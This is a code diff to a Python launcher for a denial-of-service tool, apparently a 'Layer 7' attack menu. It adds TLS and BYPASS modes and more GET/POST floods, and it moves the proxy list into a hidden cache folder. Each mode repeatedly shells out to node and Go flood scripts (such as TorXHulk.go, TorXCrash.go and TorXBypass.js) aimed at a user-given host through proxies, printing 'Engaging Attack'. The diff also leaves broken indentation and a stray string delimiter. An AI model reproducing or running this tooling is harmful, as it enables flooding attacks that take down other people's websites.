@@ -1,14 +1,14 @@
 import os as o, time as t, sys as s, random as r
 
-def progress(current, total, bar_length=30):
-    filled_length = int(bar_length * current // total)
-    bar = '█' * filled_length + '-' * (bar_length - filled_length)
+def progress(current, total, bar_len=30):
+    fil_len = int(bar_len * current // total)
+    bar = '█' * fil_len + '-' * (bar_len - fil_len)
     return f"[{bar}] {current}/{total}"
 
 def clr_csl():
     o.system('cls' if o.name == 'nt' else 'clear')
 
-def load_prxs(file_path='proxy.txt'):
+def load_prxs(file_path='bin/odd/.cache/proxy.txt'):
     try:
         with open(file_path, 'r') as file:
             for line in file:
@@ -105,24 +105,21 @@ def main_loop():
             dis_dash()
             continue
         
-        elif command == "LAYER7":
-            load_ani("Loading Methods", 1.5)
-            print('''Available Layer 7 Methods and Usage:
-            
-            1. TOR - Usage: TOR <URL> <TIME>
-               Example: TOR https://example.com 60
+elif command == "LAYER7":
+    load_ani("✨ Loading Layer 7 Methods ✨", 1.5)
+    print('''
+━━━━━━━━━━━ Layer 7 Methods ━━━━━━━━━━━
 
-            2. FLOOD - Usage: FLOOD <URL> <TIME>
-               Example: FLOOD https://example.com 60
+1. TOR: TOR https://example.com 60
+2. FLOOD: FLOOD https://example.com 60
+3. HTTPX: HTTPX https://example.com 60
+4. HTTPS: HTTPS https://example.com 60
+5. RESET: RESET https://example.com 60
+6. BYPASS: BYPASS https://example.com 60
 
-            3. HTTPX - Usage: HTTPX <URL> <TIME>
-               Example: HTTPX https://example.com 60
-
-            4. HTTPS - Usage: HTTPS <URL> <TIME>
-               Example: HTTPS https://example.com 60
-
-            5. RESET - Usage: RESET <URL> <TIME>
-               Example: RESET https://example.com 60
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ Use Responsibly! ⚠️
+''')
             ''')
             continue
 
@@ -139,8 +136,8 @@ def main_loop():
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'node bin/odd/.cache/TOR.js GET "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
-                    o.system(f'node bin/odd/.cache/TOR.js POST "{host}" {max_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    o.system(f'node bin/odd/.cache/TOR.js GET "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    o.system(f'node bin/odd/.cache/TOR.js POST "{host}" {max_time} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
                     t.sleep(1)
 
             except IndexError:
@@ -157,13 +154,32 @@ def main_loop():
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'go run bin/odd/.cache/HULK.go --site {host} --data GET')
-                    o.system(f'go run bin/odd/.cache/CRASH.go {host} 9999 get {max_time} nil')
+                    o.system(f'go run bin/odd/.cache/TorXHulk.go --site {host} --data GET')
+                    o.system(f'go run bin/odd/.cache/TorXCrash.go {host} 9999 get {max_time} nil')
+                    o.system(f'go run bin/odd/.cache/TorXHulk.go --site {host} --data POST')
+                    o.system(f'go run bin/odd/.cache/TorXCrash.go {host} 9999 POST {max_time} nil')
                     t.sleep(1)
 
             except IndexError:
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 60')
+        elif command == "TLS":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node bin/odd/.cache/TorXDark.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: TOR https://example.com 60')
+
 
         elif command == "HTTPX":
             try:
@@ -175,8 +191,8 @@ def main_loop():
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'node bin/odd/.cache/HTTPX.js {host} {max_time} 8 8 proxy.txt')
-                    o.system(f'node bin/odd/.cache/HTTPZ.js {host} {max_time} 8 8 proxy.txt')
+                    o.system(f'node bin/odd/.cache/HTTPX.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/HTTPZ.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
                     t.sleep(1)
 
             except IndexError:
@@ -193,14 +209,32 @@ def main_loop():
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'node bin/odd/.cache/HTTPS.js POST {host} {max_time} 8 8 proxy.txt')
-                    o.system(f'node bin/odd/.cache/HTPPSV2.js GET {host} {max_time} 8 8 proxy.txt')
+                    o.system(f'node bin/odd/.cache/HTTPS.js POST {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/HTPPSV2.js GET {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
 
                     t.sleep(1)
 
             except IndexError:
                 print('❌ Invalid Command. Usage: METHOD URL TIME')
                 print('Example: TOR https://example.com 60')
+
+        elif command == "BYPASS":
+            try:
+                host = parts[1]
+                time = int(parts[2])
+                max_time = 60
+                start_time = t.time()
+
+                ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
+
+                while t.time() - start_time < time:
+                    o.system(f'node bin/odd/.cache/TorXBypassV2.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
+                    o.system(f'node bin/odd/.cache/TorXBypass.js {host} {max_time} 90 20 bin/odd/.cache/proxy.txt')
+                    t.sleep(1)
+
+            except IndexError:
+                print('❌ Invalid Command. Usage: METHOD URL TIME')
+                print('Example: BYPASS https://example.com 60')
 
         elif command == "RESET":
             try:
@@ -212,8 +246,8 @@ def main_loop():
                 ani_txt(f"Engaging Attack on {host} for {time} seconds... 💥", 0.05)
 
                 while t.time() - start_time < time:
-                    o.system(f'node bin/odd/.cache/RESETV2.js {host} {max_time} 8 8 proxy.txt --full')
-                    o.system(f'node bin/odd/.cache/RESET.js {host} {max_time} 8 8 proxy.txt')
+                    o.system(f'node bin/odd/.cache/RESETV2.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt --full')
+                    o.system(f'node bin/odd/.cache/RESET.js {host} {max_time} 8 8 bin/odd/.cache/proxy.txt')
                     t.sleep(1)
 
             except IndexError:
